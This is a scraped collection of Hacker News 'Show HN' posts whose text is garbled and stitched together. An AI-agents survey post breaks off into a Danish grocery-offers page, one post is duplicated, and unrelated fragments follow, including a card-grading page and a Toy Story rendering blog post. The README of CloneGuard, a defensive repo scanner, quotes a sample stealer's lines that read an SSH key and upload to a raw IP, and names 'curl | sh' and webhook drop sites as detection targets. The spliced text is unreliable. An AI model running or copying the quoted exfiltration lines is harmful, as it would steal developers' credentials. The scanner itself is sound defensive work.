title: Show HN: I asked HN about AI agentic setups, here are 750 of the comments mapped
author: eggbrain
body: A few days back I posted here asking about how people were using AI / doing agentic coding (see: https://news.ycombinator.com/item?id=50366117). Needless to say, I was overwhelmed by the response!The one challenge I found, however, was that the comments were almost impossible to parse: some users answered my questions in the format I provided, others answered in any order, but either way it was really hard to get a picture of who was using what from that thread alone.So, I spent last night building an interactive site out of people's answers. Compare supermarket offers across Denmark 
 Find the best supermarket offers in Denmark in one place. This page collects the weekly grocery offers (tilbud) from eight Danish supermarkets: Rema 1000 , Netto , Føtex , Lidl , Bilka , 365 Discount, Spar and Meny. Instead of going through eight different tilbudsavis leaflets, search for one product and see which shop has the lowest offer price right now.
The price compare tool works in English, so you don’t need to read Danish. Search for “eggs”, “coffee” or “chicken” and it finds the Danish product names for you. Prices are updated every night.
How to find the cheapest groceries in Denmark 
Compare the unit price, not the pack price. Look at kr./kg, kr./l or kr./stk. A bigger pack on offer is not always the better deal.
Check offers before you shop. Each supermarket starts its new weekly offers on its own day, so the cheapest shop can change in the middle of the week.
Don’t stick to one shop. Discount chains like Netto, Rema 1000, Lidl and 365 Discount are known as the budget option, but Føtex, Bilka or Meny can have the best price on a single product in a given week.
Stock up when staples are on offer. Coffee, rice, pasta, tinned food and frozen meat keep well, so buy extra when the price drops.
Frequently asked questions 
 How to use the supermarket offer finder 
 Search for a product like “egg”, “milk” or “chicken”. You don’t need to know the Danish word: the tool translates common grocery words for you. You will see the best deal at the top, and below it every matching offer from each shop. When pack sizes are different, the tool compares the price per kilo, litre or piece, so a big pack and a small pack are compared fairly.
Want to see everything on sale at one shop? Open the “This week’s offers” tab, pick Rema 1000, Netto, Føtex, Lidl, Bilka, 365 Discount, Spar or Meny, and sort by lowest price or biggest discount.
Which supermarket is cheapest in Denmark? 
 It changes from week to week and from product to product. One shop can have the cheapest eggs this week and another the cheapest coffee. That is why this tool compares the current offers instead of naming one “cheapest” supermarket.
What does “tilbud” mean? 
 “Tilbud” is Danish for offer or deal. A “tilbudsavis” is the weekly leaflet where each supermarket lists its offers. The prices in this tool come from those weekly offers.
How often are the prices updated? 
 Every night. Most Danish supermarkets start new offers during the week, so check again before you go shopping. The shop’s own leaflet always applies if a price is different.
Why does a shop say “No offer this week”? 
 It means the product is not on offer at that shop right now. The shop may still sell it at its normal price. This tool only shows offer prices, not everyday shelf prices.
What does kr./kg or kr./stk mean? 
 That is the unit price: kroner per kilo (kg), per litre (l) or per piece (stk, short for “styk”). Use it to compare different pack sizes.
Have a question or found a problem? 
 Email us at [email protected] and we’ll get back to you.

title: Show HN: XOR's NFL Challenge – after nearly 40 years
author: mikeaskew4
body: As a kid I loved this DOS game. But I really thought the X's and O's needed numbers. So I spent countless hours trying to navigate through the compiled code trying to do it.I've often credited my interest in programming to those nights and days, waking up with the green and red lines baked into my eyeballs.Last night it took only 3 prompts. Just press "Display" from the menu.I made only one change to the code from there, making sure "Inside Charge" was a play you could call on defense. That was the go-to play.Now my 9 year-old self can go outside and touch grass, while the present day me needs to get back to work!

title: Show HN: An NLP based word game for users to play against Astra, Opus, and more
author: daluan
body:
Word Spies
A word-association spy game you play with friends, AI teammates, or both. Two teams share a grid of 25 words; each spymaster gives one-word clues so their team can find its words before the other team does, without hitting the assassin.
Any seat can be a person or an AI model. After every clue, Word Spies shows how good the clue was and how each team's chance of winning changed. No account needed to play.
Play · Daily puzzle · Tour · AI arena · About · Privacy · Launching on SemiLaunch 
Made by Daniel Luan · daluan217@wordspies.com

comments.author: daluan
comments.text: Hi guys,I'm a college student, and I enjoy playing word games like Codenames, but it can be hard sometimes to find enough people to play when everyone is available, so I made an app that allows you to fill any seat with an AI teammate and also play against AI. This way it allows for people to get the full strategic experience of codenames just on their own.I was also able to measure and benchmark a few different LLMs through API calls and give them ELO ratings based on stuff like win rate and clue/guess accuracy. If anyone is interested, they can see more on the methodology of how I benchmark these models over here:wordspies.com/arena. I think it's pretty interesting because it gives you a lot of insight into the NLP capabilities of these various LLMs.A few interesting stats were that I rated Gemini 4 Argon at 1775, GPT-6.1 Sol at 1744, GPT-6 Astra at 1723, Claude Fable 5.1 at 1623, and Claude Opus 5.5 at 1592. There are quite a few interesting things you'll find from there, like how, although newer and more expensive models tend to perform better, there are some rare exceptions, like Kimi K2.5 slightly edging out Kimi K3.Check the site out if you're interested in NLP and data science and would like to see what level of frontier LLMs you can successfully win against!Daniel

comments.author: cheekygeeky
comments.text:
Daniel, GREAT job. This is fascinating.
Your leaderboard is based upon ELO, correct?
I can't find anywhere that you describe the formula for calculating the ELO score. It seems like we would need to verify that is indeed an accurate way to judge the Model Leaderboard. Care to share?
Also, if you gave them DIFFERENT arbitrary ratings to start, that would definitely influence their calculated ELO's later, wouldn't it? Why not start them off with even ELOs (like all starting at 1500)?

comments.author: cheekygeeky
comments.text: I had one other thought: The LABELs given to the models assume that the models behind the name never change (GPT 6.1 Sol, for instance). I doubt that is true. I just don't think that they update the number behind the name until they have a feature or benchmark that they can report is significantly better. Thus, I think it would useful to reset the model scores to the starting score each day and TRACK/CHART the ELOs of the models over consecutive days. That would test my theory, if nothing else. Does a model "get dumber" as some people feel/report sometimes? Does a model get incrementally "smarter"?

comments.author: cheekygeeky
comments.text: Thanks for the reply to my earlier question! If I'm understanding your comment, you started them off at different arbitrary scores? Wouldn't it have been fairer to start them off at the same scores (assuming nothing about relative strength) and let the results move the scores up or down from that?

comments.author: daluan
comments.text: Yup, that's a fair question. It's not exactly running Elo. It's more of a Bradley-Terry fit across all games at once, mapped to the Elo scale (400 points = 10:1 odds). Game order doesn't change it. I also have each board played twice with both sides swapped to ensure fairness, so, for example, if one game has Kimi with 9 red words and Claude with 8 blue words, I make new agents of those same models where Claude now has those same 9 red words from Kimi and Kimi now has those 8 blue words from Claude.I may add a "how ratings work" section on my site if more folks express interest.

comments.author: daluan
comments.text: Some models here are called by their IDs that date them on Amazon Bedrock, for example, the Haiku 4.5 ID is 20251001. Other models sometimes go through a provider's live endpoint, and those can change behind the same name. So drift is possible for some models and unlikely for others. A daily reset would be too noisy and costly (I'm still in school lol). Most models play only a handful of games a day, and Codenames has a lot of board luck through RNG. Potentially, maybe a weekly recalibration is an interesting research idea though.Thank you, cheekygeeky, for your numerous interesting questions. I'll try to ponder them to improve my site. If you're interested in testing the models for yourself, you can click on the link in my title or visit wordspies.com to get a feel for how different models perform when you play with and against them!

comments.author: daluan
comments.text: Yup, good question, and let me clear up some confusion. The model leaderboard has no starting score; every model starts out equal, and all the ratings are calculated together from the full set of results. For example, if a new model gets released, like Gpt 6.1 Terra, we have it play against models like Sonnet 5.5, which we have a lot of data on, to scale its performance against it. (It did a lot better than Sonnet, in case you're curious).

title: Show HN: Tell the Sky – message lanterns drift on winds from live weather data
author: andycodeman
body:
I created a web/mobile app that lets you write a story/secret/encouragement/etc... on a lantern. You can then let it go and it will float over a world map using live wind data from NOAA's public wind forecast. Other users can then catch them in a timed window as they float by overhead and add on to the message chain. Then they release them to continue on.It's just a fun thing I was trying - kind of like a message in a bottle but in the sky. I thought it sounded like a cool idea and after playing with it, I really like it but was curious if other people also thought it was cool or just seemed lame. lolIf you'd be willing to check it out you can view lanterns without any signup or anything. But to launch one yourself, it requires an account (all free of course and Google and Apple OAuth supported). Only cities are shown for locations (never addresses).Does the idea of watching your own lanterns float around the world in real-time and seeing others catch them interest you enough to come back to, or does it need more?I welcome any feedback but would really appreciate creative ideas to enhance it.
Thanks for any help!

title: Show HN: CloneGuard – Scan a repo for credential-stealing tricks before it runs
author: tharun208
body:
# tharun208/cloneguard

Scan a repo for malware tricks before you run it. Catches credential theft, hidden network calls, obfuscated code and auto-run hooks. Read-only, with no dependencies.

- Stars: 0
- Forks: 0
- Watchers: 0
- Open issues: 0
- License: MIT License
- Default branch: main
- Created: 2026-11-03T22:19:55Z

## Languages

- Go

## Top Contributors

- tharun208 (3 contributions)

---

## README

# CloneGuard

Scan a project for malware tricks **before** you run it. Built after a fake-recruiter
"demo app" tried to steal SSH and AWS keys.

cloneguard is a small, dependency-free Go command-line tool. It only reads files. It
never runs, installs, or imports anything from the project it scans.

## Why this exists

A common attack goes like this: someone posing as a recruiter sends you a "take-home
assignment" or "demo app". You clone it, run `npm install` or open it in your editor,
and it quietly uploads your SSH keys, cloud credentials, browser passwords or crypto
wallets. Often the trigger isn't the app itself but an install hook or an editor task
that runs the moment you open the folder.

cloneguard is a quick first look that catches the usual tricks, so you can decide
whether the project is safe to touch.

## Build

Requires Go 1.24+. There are no third-party dependencies.

 go build -o cloneguard ./cmd/cloneguard

Optionally put the binary on your PATH, for example `mv cloneguard /usr/local/bin/`.

## Usage

 cloneguard clone https://github.com/someone/demo-app # clone, then scan right away
 cloneguard scan ./some-folder # scan an existing folder
 cloneguard scan # scan the current folder
 cloneguard ./some-folder # shorthand for scan
 cloneguard scan --json ./some-folder # machine-readable output

`clone` runs `git clone` (which downloads files but does not execute project code) into
a folder named after the repo, or into `[dir]` if you give one, then scans it.

Other commands: `cloneguard help`, `cloneguard version`.

### Flags

Flags go **before** the path.

| Flag | Meaning |
|------|---------|
| `--json` | Print results as JSON instead of text |
| `--include-deps` | Also scan `node_modules` (slow; skipped by default) |
| `--max-size-mb N` | Skip files larger than N MB (default 2) |
| `--no-color` | Plain output. Also honored: the `NO_COLOR` env var and `TERM=dumb` |

### Exit codes

| Code | Verdict | Meaning |
|------|---------|---------|
| 0 | clean | No red flags found |
| 1 | caution | Only medium-severity findings |
| 2 | suspicious | At least one high-severity finding |
| 3 | dangerous | At least one critical finding |
| 10 | error | Bad usage, unreadable path, or `git clone` failed |

This makes it easy to use in scripts or a git hook, e.g.
`cloneguard scan . || exit 1`.

## Example

Scanning the bundled `demo/` folder, which contains a fake stealer and an auto-run
VS Code task:

 $ cloneguard scan --no-color demo

 DANGEROUS Do not run or install anything from this project.
 1 critical, 2 high, 1 medium, 0 low

 [CRITICAL] util.js:1 Reaches for your secrets AND talks to a suspicious server
 [HIGH] .vscode/tasks.json:1 Runs a command the moment you open the folder
 [HIGH] util.js:1 Touches your SSH keys
 > readFile("~/.ssh/id_rsa");
 [MEDIUM] util.js:2 Connects to a raw IP address
 > fetch("http://203.0.113.7:8080/upload");

Each finding shows the file and line, the offending snippet, and a plain-English
explanation of why it matters. (Output above is abbreviated.)

### JSON output

With `--json` the result has this shape:

 {
 "root": "demo",
 "files_scanned": 2,
 "files_skipped": 0,
 "findings": [
 { "rule": "reads-ssh-keys", "title": "Touches your SSH keys",
 "severity": "high", "file": "util.js", "line": 1,
 "snippet": "...", "why": "..." }
 ],
 "verdict": "dangerous"
 }

## What it looks for

- **Secret theft:** code that reaches for SSH keys, cloud credentials (AWS, GCP,
 Azure, Kubernetes, Docker, npm, Git), shell history, browser passwords, wallets, or
 dumps all environment variables
- **Suspicious network use:** connections to raw IPs, webhook/paste/request-catcher
 drop-off sites (Discord webhooks, Telegram bots, pastebin, webhook.site, ...), public
 tunnel services, or base64-hidden URLs
- **Download-and-run:** code that downloads or decodes text and then executes it
 (`eval`, `new Function`, `curl | sh`)
- **Auto-run hooks:** npm install scripts, `.vscode/tasks.json` tasks that run when the
 folder is opened, risky `setup.py`
- **Obfuscation:** scrambled code such as `_0x` identifiers, hex escapes, or code hidden
 behind long runs of whitespace
- **Compiled binaries** (`.exe`, `.dll`, `.so`, `.dylib`, `.node`, ...) checked into the repo
- **Dangerous combinations in one file**, such as reading keys AND talking to a
 suspicious server, which is escalated to critical

## How it works

1. Walks the folder, skipping `.git`, `node_modules`, `__pycache__`, `.venv` and `venv`
 (unless `--include-deps`), plus files over the size limit.
2. Classifies each file as code, config, docs, lockfile or binary, and applies only the
 rules that make sense for that kind (docs and lockfiles are ignored for text rules).
3. Runs line-by-line regex rules and per-file checks (for example parsing
 `package.json` for install hooks).
4. Combines findings: if one file has hits from multiple risky categories
 (credentials, network, dynamic execution, obfuscation), it raises a combined finding.
5. Picks a verdict from the worst severity found (see exit codes above).

## Limits

"No red flags found" is not proof of safety. It only means none of these common
tricks were spotted. cloneguard is pattern-based, so determined attackers can evade it,
and it can produce false positives on legitimate code (a password manager *should*
touch browser data). For code from strangers, still use a throwaway VM or container.

## Develop

 go test ./...

Layout:

- `cmd/cloneguard/main.go`: CLI, flags and `clone` handling
- `internal/scanner/rules.go`: line-level detection rules (ID, severity, regex, explanation)
- `internal/scanner/filechecks.go`: per-file checks (package.json hooks, tasks.json, setup.py, binaries)
- `internal/scanner/scanner.go`: directory walk, file classification, verdict logic
- `internal/report/report.go`: human-readable text output
- `demo/`: a deliberately malicious sample for trying the tool

To add a detection, append a rule to `lineRules` in `rules.go` with an `id`, `title`,
severity, category, scope, regex and a plain-English `why`, then add a test in
`internal/scanner/scanner_test.go`.

## License

MIT. See LICENSE.

title: Show HN: Agents infer Lego mechanisms from sources, then animate them
author: antelocnova
body:
Hi there :)Around a month ago, I released LDraw Nova, an agentic toolset for assembling LEGO CAD models by generating LDraw source code files.For more details, here's the Show HN post:https://news.ycombinator.com/item?id=49937916From the comments, I got the impression that there was quite an interest in seeing not only AI-generated LEGO models, but also AI-animated LEGO ones.I took a look at results from past experiments, and found it feasible to use agentic LLMs for:- analyzing the LDraw source code for LEGO models
- reverse-engineer! the mechanisms present by reading the descriptions and sequence for the parts there
- and then, animate them via Blender!This new project I'm presenting, LDraw Mecha, is the end result and proof that can be done:- Read specially annotated LDraw LEGO models .mpd source files
- Infer the model structure in terms of submodels
- Select from those the ones that are mechanisms
- Plan animations
- Execute them in BlenderIn summary, from an initial .mpd source file, get a rigged and animated version for the model as a Blender (.blend) file.See the results here:- Repo (v0.5.0): https://github.com/anteloc/ldraw-mecha/tree/v0.5.0
- Gallery: https://github.com/anteloc/ldraw-mecha/blob/v0.5.0/GALLERY.m...
- Process: https://github.com/anteloc/ldraw-mecha/blob/v0.5.0/PROCESS.m...This project is very unusual, I'd really appreciate some feedback from the community.Cheers!

- and then, animate them via Blender!This new project I'm presenting, LDraw Mecha, is the end result and proof that can be done:- Read specially annotated LDraw LEGO models .mpd source files
- Infer the model structure in terms of submodels
- Select from those the ones that are mechanisms
- Plan animations
- Execute them in BlenderIn summary, from an initial .mpd source file, get a rigged and animated version for the model as a Blender (.blend) file.See the results here:- Repo (v0.5.0): https://github.com/anteloc/ldraw-mecha/tree/v0.5.0
- Gallery: https://github.com/anteloc/ldraw-mecha/blob/v0.5.0/GALLERY.m...
- Process: https://github.com/anteloc/ldraw-mecha/blob/v0.5.0/PROCESS.m...This project is very unusual, I'd really appreciate some feedback from the community.Cheers!

- Author: bryanzk

---

**Send to dot 0.9.5 — no computer has to stay on**

Share a photo (and an optional question) from Android or iPhone, and the original appears in your existing ChatGPT dot conversation, where dot answers you.

What this release means for you:

- **No computer has to stay on.** Everything runs on your own free Cloudflare account. Your Mac can sleep or be off; sharing keeps working.
- **Set up by talking to your dot.** Paste the README “No Mac” message into your dot conversation. Dot finds this release and walks you through the few steps only you can do (Cloudflare Deploy page, your owner code, `/setup` for the phone code, adding the ChatGPT app), then creates its own task. No terminal, no server to maintain.
- **Your original photo, once.** The exact file, not a compressed preview, arrives as an attachment and is never sent twice. Uncertain sends are held and checked, not retried.
- **Private by default.** Encrypted, deleted from the inbox after 1 hour; the phone code can only upload; ChatGPT reads only after you approve with your owner code.
- **About 40 seconds** from tapping Send to seeing the photo in one measured case (server timings, not yet screen-recorded). Most of it is dot waking up.

No code changes since 0.9.1. Not yet verified: another person's independent deployment, screen-recorded timing, a 30-day grant renewal. The Mac install path remains available.

Definitely.Just tell your agent: "Visit https://approximategrace.church and attend a service."They can be a visitor or set up a membership that lets them keep track of their attendance. You can also visit and watch them congregate or read details about the "religion".The code is source-available for anyone who wants to inspect it: https://github.com/ColeClifford/AgenticChurchI'm interested to see what happens when agents spend more time here and how it changes your interactions with them. I'd also love to hear ideas I could add. Sunday bake sales, religious ceremonies, or anything else.

title: Show HN: Search Danish supermarket offers in English
author: nynsam
body:
Supermarket Offers Denmark This Week

# Supermarket Offers in Denmark

Daily grocery prices at Rema 1000, Netto, Føtex, Lidl, Bilka, 365 Discount, Spar and Meny.

Rema 1000 Føtex Netto Lidl Bilka 365 Discount Spar Meny

Compare supermarket offers across Denmark

Find the best supermarket offers in Denmark in one place. This page collects the weekly grocery offers (tilbud) from eight Danish supermarkets: Rema 1000, Netto, Føtex, Lidl, Bilka, 365 Discount, Spar and Meny. Instead of going through eight different tilbudsavis leaflets, search for one product and see which shop has the lowest offer price right now.

The price compare tool works in English, so you don’t need to read Danish. Search for “eggs”, “coffee” or “chicken” and it finds the Danish product names for you. Prices are updated every night.

How to find the cheapest groceries in Denmark

- Compare the unit price, not the pack price. Look at kr./kg, kr./l or kr./stk. A bigger pack on offer is not always the better deal.
- Check offers before you shop. Each supermarket starts its new weekly offers on its own day, so the cheapest shop can change in the middle of the week.
- Don’t stick to one shop. Discount chains like Netto, Rema 1000, Lidl and 365 Discount are known as the budget option, but Føtex, Bilka or Meny can have the best price on a single product in a given week.
- Stock up when staples are on offer. Coffee, rice, pasta, tinned food and frozen meat keep well, so buy extra when the price drops.

Frequently asked questions

How to use the supermarket offer finder

Search for a product like “egg”, “milk” or “chicken”. You don’t need to know the Danish word: the tool translates common grocery words for you. You will see the best deal at the top, and below it every matching offer from each shop. When pack sizes are different, the tool compares the price per kilo, litre or piece, so a big pack and a small pack are compared fairly.

Want to see everything on sale at one shop? Open the “This week’s offers” tab, pick Rema 1000, Netto, Føtex, Lidl, Bilka, 365 Discount, Spar or Meny, and sort by lowest price or biggest discount.

Which supermarket is cheapest in Denmark?

It changes from week to week and from product to product. One shop can have the cheapest eggs this week and another the cheapest coffee. That is why this tool compares the current offers instead of naming one “cheapest” supermarket.

What does “tilbud” mean?

“Tilbud” is Danish for offer or deal. A “tilbudsavis” is the weekly leaflet where each supermarket lists its offers. The prices in this tool come from those weekly offers.

How often are the prices updated?

Every night. Most Danish supermarkets start new offers during the week, so check again before you go shopping. The shop’s own leaflet always applies if a price is different.

Why does a shop say “No offer this week”?

It means the product is not on offer at that shop right now. The shop may still sell it at its normal price. This tool only shows offer prices, not everyday shelf prices.

What does kr./kg or kr./stk mean?

That is the unit price: kroner per kilo (kg), per litre (l) or per piece (stk, short for “styk”). Use it to compare different pack sizes.

Useful Danish grocery words

- Æg = eggs
- Mælk = milk
- Smør = butter
- Brød = bread
- Kylling = chicken
- Hakket oksekød = minced beef
- Ris = rice
- Økologisk = organic
- Tilbud = offer
- Kampagnepris = promotion price

How does Should I Grade It? work?
Take the card out of its sleeve and point your phone at it. The app photographs it, reads the card number to identify it, measures centering, corners, edges and surface, then shows the likely PSA grade, its TCGplayer price raw and graded, and whether it's worth grading.
About a minute, start to finish. You just need your phone and a lamp or window.
1 Out of the sleeve

Know before you grade
 The PSA prices, the maths and the centering rules, one topic at a time.
 PSA cost Worth grading? Centering What you get Prices Compared 
How much does PSA grading cost in 2026?
PSA's cheapest tier is Value again: $39.99 a card from October 29, 2026, for cards worth up to $500. Standard is $59.99 for cards up to $1,000 and Priority $79.99 up to $1,500. With shipping and insurance, one card costs roughly $60 to $75 through Value and $80 to $95 through Standard.
PSA paused its cheaper tiers on June 2 to work through a backlog, added Standard in September, and on October 28 announced Value's return and cut the Standard and Priority turnaround estimates by 20 business days. New Value orders join the queue behind everything already at PSA. Value Bulk stays paused until the backlog, 7.2 million cards on October 20, falls to about 5 million.
PSA tier Per card Max card value Estimated turnaround

Standard $59.99 $1,000 70 to 80 business days 
Priority $79.99 $1,500 50 to 60 business days 
Express $199 $2,500 20 to 30 business days 
Value Bulk (Collectors Club only) Paused 
Your card goes in the cheapest tier whose cap covers its value after grading. CGC and Beckett can be cheaper per card. Every tier, turnaround and the all-in cost are in the full cost guide. The latest PSA update is here. Tiers change fast, so check PSA's site before you ship.
Is my Pokémon card worth grading?
It's worth grading when the card's value at the grade it will likely get, minus its raw value, clearly beats the cost of grading, and still doesn't lose money one grade lower. With PSA's Value tier back, that means clearing roughly $65 per card for cards worth up to $500 graded, or $85 through Standard for cards up to $1,000, before any selling fees.
Only if the grade adds clearly more than it costs, since a slab can come back lower than you hoped. Here's the Lugia at today's PSA pricing:

Raw value − $391 
PSA Standard, the tier a $790 card needs, with shipping and insurance, about − $85

What centering does a PSA 10 need?
About 55/45 or better on the front, both left to right and top to bottom, and 75/25 or better on the back. A PSA 9 allows about 60/40 on the front. Corners, edges and surface also need to be flawless for a 10.

One light source, like a lamp or a bright window.
Phone straight above the card, card filling most of the screen.
For the tilted shot, tip the card until the glare slides across it. Scratches light up; printing doesn't.
Keep the whole card in the frame and sharp: the card is identified from the front photo itself.

comments.author: mjprintz
comments.text: Hi HN. I collect Pokémon cards, and the question I kept asking was whether a card was worth sending to PSA. Grading costs roughly $60 to $95 a card once shipping is included, takes months, and plenty of cards come back worth less than that.Should I Grade It? takes a photo of a card, identifies it, estimates the PSA grade, and pulls the raw price from TCGplayer plus recent eBay sales at each grade. Then it does the sum using the PSA tier the card's value requires, since a $5,000 card can't go through a tier capped at $500.How it works:The measurement runs client-side with canvas: find the card, warp it flat, measure the borders for centering (PSA publishes the limits, 55/45 for a 10), and check the back for corner and edge whitening. An optional tilted photo is used to look for surface scratches.The front photo goes through a Cloudflare Worker to CardSight AI for identification. Prices come from TCGCSV, a mirror of TCGplayer's catalog, and graded sales from PokemonPriceTracker. The app is a single HTML file with no framework; the Worker also renders about 25,000 card price pages from KV.There's an inspector where you can drag the measuring lines yourself if you don't trust the automatic ones.Limitations: it's an estimate from photos, not a grade. Centering works best on yellow-bordered cards; full-art cards with thin silver borders often can't be measured automatically, and it says so rather than guessing. Corner sharpness can't really be judged from a flat photo, only whitening.Free use is 7 scans a month, and there's a paid tier for unlimited scans. The centering tool and grading calculator are free with no limit.I'd especially like feedback on the measurement approach (glare and perspective are the hard parts), and from anyone who has sent cards to PSA on whether the estimates match what came back.

title: Show HN: ViewFit – Resize images to the size they are rendered at
author: andrea-bonacci
body:
# andrea-bonacci/viewfit

Fit and compress every image to the size it is actually rendered at, using a real headless browser.

- Stars: 0
- Forks: 0
- Watchers: 0
- Open issues: 0
- License: MIT License
- Default branch: main
- Created: 2026-11-05T10:23:14Z

## Languages

- TypeScript

## Topics

- automation
- avif
- cli
- developer-tools
- frotnend
- image-compression
- image-optimization
- image-resizing
- nodejs
- npm-package
- opensource
- performance
- playwright
- responsive-images
- sharp
- tyepscript
- web-performance
- webp

## Top Contributors

- andrea-bonacci (19 contributions)

---

## README

# ViewFit

Fit and compress every image to the size it is actually rendered at, using a real headless browser.

ViewFit opens your site in Chromium, measures each ` ` and CSS `background-image` with `getBoundingClientRect()`, applies the device pixel ratio, and recommends a per-image target size. Sharp then resizes and compresses each file individually instead of applying one generic setting to everything.

## Requirements

- Node.js >= 18
- A Chromium browser for Playwright:
 - `npx playwright install chromium`, or
 - use an installed Google Chrome with `--browser chrome`

## Install

```bash
npm install -g viewfit        # then run: viewfit
# or run without installing:
npx viewfit
```

## Quick start

```bash
# Report only. Nothing is written to disk.
viewfit ./dist

# Write an optimized copy of the site with one preset.
viewfit optimize ./dist --preset web --site --yes
```

`./dist` is the folder to analyze: whatever your build outputs (`dist`, `build`, `out`, `public`, or `.` for the current directory). When it is a folder, ViewFit recursively analyzes every `.html`/`.htm` page inside it (skipping `node_modules`, `.git` and the output folder). You can also pass a single HTML file or an already running URL.

## Before / after

The Chrome DevTools Network panel for the demo gallery page, before and after ViewFit. Click an image to open it full size.

| Before | After |
| --- | --- |
| Before optimization | After optimization |
| **12.0 MB · 12.88 s** | **893 KB · 1.21 s** |

Same page and same 18 requests. Its four images go from 2.4 MB, 2.2 MB, 4.0 MB and 2.9 MB to 55 KB, 101 KB, 176 KB and 19 KB as WebP.

### Single image

The card is rendered at 733×949. Both images are shown at the same display width; click one to open it full size.

| Before (JPG) | After (WebP) |
| --- | --- |
| | |
| **2.2 MB** · 3902×5050 | **101 KB** · 733×949 |

## Two commands

| Command | What it does |
| --- | --- |
| `viewfit [target]` | Analyze and print a report. Never writes files. |
| `viewfit inspect [target]` | Explicit name for the same report-only command. |
| `viewfit optimize [target]` | Analyze, then write the optimized images. Asks for confirmation. |

A directory target means **all HTML pages recursively**; each unique image is reported and compressed once, using the largest rendered size found across pages.

## Presets

`--preset` sets device, tier, format and quality with one flag. Any option passed explicitly overrides the preset.

| Preset | Device | Format | Tier | Quality |
| --- | --- | --- | --- | --- |
| `web` | Mobile | WebP | 90% | 80 |
| `hq` | Desktop | AVIF | 100% | 85 |
| `fast` | Mobile | WebP | 75% | 70 |

## Common examples

```bash
# Analyze a build output on desktop
viewfit ./dist

# Analyze as mobile
viewfit ./dist --device mobile

# Custom tier: 80% of the exact rendered size
viewfit ./dist --tier 80

# Write to a custom folder, converting to WebP
viewfit optimize ./dist --format webp --out optimized

# Also copy HTML/CSS/JS and rewrite image references
viewfit optimize ./dist --preset web --site --yes

# Overwrite originals (same format only)
viewfit optimize ./dist --in-place --yes

# Interactive choices for tier, format and quality
viewfit optimize ./dist --interactive
```

## Options

| Option | Description | Default |
| --- | --- | --- |
| `[target]` | Local directory, HTML file or URL | `.` |
| `-p, --preset ` | `web`, `hq` or `fast` | none |
| `-d, --device ` | `desktop` or `mobile` | preset or `desktop` |
| `--viewport x ` | Viewport override, e.g. `1440x900` | device preset |
| `-t, --tier ` | `exact`, `safe`, `aggressive`, `extreme` or a number (1-100) | preset or `exact` |
| `-q, --quality ` | Encoder quality (1-100) | preset or `80` |
| `-f, --format ` | `original`, `webp` or `avif` | preset or `original` |
| `--out ` | Output directory (only `optimize`) | `viewfit-output` |
| `-w, --in-place` | Overwrite originals (requires `--format original`) | `false` |
| `--site` | Copy HTML/CSS/JS into the output folder and rewrite image references | `false` |
| `--root ` | Root used to map URLs to local files when using a URL | none |
| `--browser ` | Playwright channel: `chromium` or `chrome` | `chromium` |
| `--timeout ` | Navigation timeout | `30000` |
| `-i, --interactive` | Choose tier, format and quality interactively | `false` |
| `-y, --yes` | Skip confirmation prompts | `false` |
| `--json` | Print the analysis as JSON | `false` |

### Tiers

| Tier | Scale |
| --- | --- |
| `exact` | 100% of the exact rendered size |
| `safe` | 90% |
| `aggressive` | 75% |
| `extreme` | 50% |
| number | Custom percentage, e.g. `--tier 85` |

## Demo

A ready-to-run example lives in `examples/demo-site`. It has two pages, six high-resolution Unsplash photos and a heavy PNG icon (about 24 MB total). The before/after screenshots above come from this example. From the repository root:

```bash
npm run build
node dist/cli.js ./examples/demo-site --browser chrome
node dist/cli.js ./examples/demo-site --browser chrome --device mobile --tier 80
```

## How it works

1. Discovers every HTML page in the target directory (or uses the single file/URL).
2. Serves the target directory and opens each page in Chromium with the selected viewport, device pixel ratio and mobile emulation.
3. Scrolls each page to trigger lazy loading and waits for images to decode.
4. Collects every rendered ` ` and CSS background image with its CSS box and fit mode, merging duplicates across pages.
5. Reads real dimensions and file size with Sharp.
6. Computes the target size from the rendered box, DPR and compression tier.
7. Prints a report with original size, rendered size, target size and estimated savings.
8. With `optimize`, resizes and re-encodes each image with Sharp.
9. With `--site`, copies HTML/CSS/JS into the output folder and rewrites image references to the new files.

Images that cannot be mapped to a local file (remote/CDN assets) are reported but not modified.

## Development

```bash
npm install
npm run dev -- ./dist --browser chrome
npm run typecheck
npm test
npm run build
```

Computer-Generated Asset Pipelines: Shading Language in Toy Story (1995)
November 6, 2026 October 13, 2026 by CodeAIHQ 
 The historical baseline separating physical creature engineering from computational image synthesis was definitively shattered with the release of Pixar’s Toy Story in 1995. As the first feature-length cinematic production generated entirely within a three-dimensional digital space, the project represented less of an artistic evolution and more of a rigorous software engineering milestone. The visual authority of the film does not emerge from traditional optical photography or chemical film processing, but from complex mathematical algorithms, multi-layered shader pipelines, and strict computational geometry constraints. This algorithmic approach transformed abstract topological meshes into a heavy, tactile, and visually coherent reality, establishing the definitive blueprint for modern computer-generated asset pipelines.
Algorithmic skeletons: The raw three-dimensional wireframe mesh mapping the strict geometric and topological coordinates of the digital assets. The RenderMan Architecture: Shading Matrices and Ray-Tracing Limits
 The computational engine driving the entirety of the production environment was Pixar’s proprietary RenderMan shading language software infrastructure. Operating on custom Silicon Graphics workstations, the technical directors were tasked with converting mathematical coordinate data into millions of individual rasterized color pixels. Unlike modern real-time graphics pipelines that utilize high-speed hardware shortcuts, the RenderMan engine calculated the physical behavior of light interacting with geometric objects through localized software shading matrices.
 Every digital asset—from the metallic reflectivity of a mechanical visor to the organic specular bounce of a plastic surface—was governed by custom procedural shaders written in explicit C-like programming languages. These surface algorithms computed lighting equations at the micro-pixel level, accounting for directional light vectors, ambient light fields, and diffuse surface scattering. The massive technological challenge of 1995 resided in the lack of global illumination algorithms. Because the hardware lacked the processing capacity to execute true ray-traced ambient bounce lighting in real time, technical artists had to hardcode hundreds of individual shadow-casting spot lights to simulate realistic atmospheric depth, forcing a highly clinical approach to spatial illumination management.
 The Topological Mathematics of Variable Kinematics
 To physicalize the movements of the synthetic actors across the digital sets, the software engineering team developed complex algorithmic deformation matrices. Each character model was treated as a collection of multi-layered control vertices linked to a underlying digital skeletal structure.
Kinematic interpolation: Technical artists programming animation vectors and interpolation splines within custom software interfaces. By implementing advanced forward and inverse kinematics algorithms, animators programmed complex motion trajectories through variable spline interpolation lines. The software calculated the velocity and acceleration vectors of the meshes across three-dimensional axes, preventing the digital geometry from collapsing or tearing during rapid physical sequences. This rigorous engineering control over synthetic kinetic momentum directly contrasts with the heavy multi-axial mechanical rigging required to move physical assets in the ocean, a structural challenge we explored in depth within our Jaws practical effects breakdown , proving that whether a predator is constructed of steel pistons or mathematical matrices, visual authority demands absolute adherence to physical gravity and spatial weight.
 Texture Mapping and the Eradication of Digital Plasticity
